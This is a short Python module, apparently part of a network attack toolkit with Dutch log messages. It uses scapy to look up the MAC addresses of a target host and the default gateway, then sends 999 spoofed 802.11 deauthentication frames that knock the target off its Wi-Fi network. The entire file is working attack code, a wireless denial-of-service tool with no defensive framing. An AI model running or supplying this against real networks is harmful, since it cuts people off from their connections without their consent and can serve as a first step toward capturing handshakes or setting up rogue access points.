import netifaces
from log import log_error, log_info
from scan.ping import ping_host
from utils import arp
from scapy.all import *

def deauth(ip: str):
    gws = netifaces.gateways()
    ip_gateway = gws["default"][2][0]


    mac_host = ""
    mac_gateway = ""
    try:
        mac_host = arp(ip)
    except:
        log_error(f"geen mac voor {ip}")
        return

    try:
        mac_gateway = arp(ip_gateway)
    except:
        log_error(f"geen mac voor {ip_gateway}")
        return

    x = "ff:ff:ff:ff:ff:ff"

    log_info(f"default gateway:\t{ip_gateway}\t{mac_gateway}")
    log_info(f"target:\t\t{ip}\t{mac_host}")
    log_info("[red]Sending deauth frames[/red]")
    dot11 = Dot11(
            type=0,
            subtype=12,
            addr1=mac_host,
            addr2=mac_gateway,
            addr3=mac_gateway
            )
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.9, count=999, verbose=0 )#iface="wlan0mon", verbose=1)
    log_info("[red]Done[/red]")
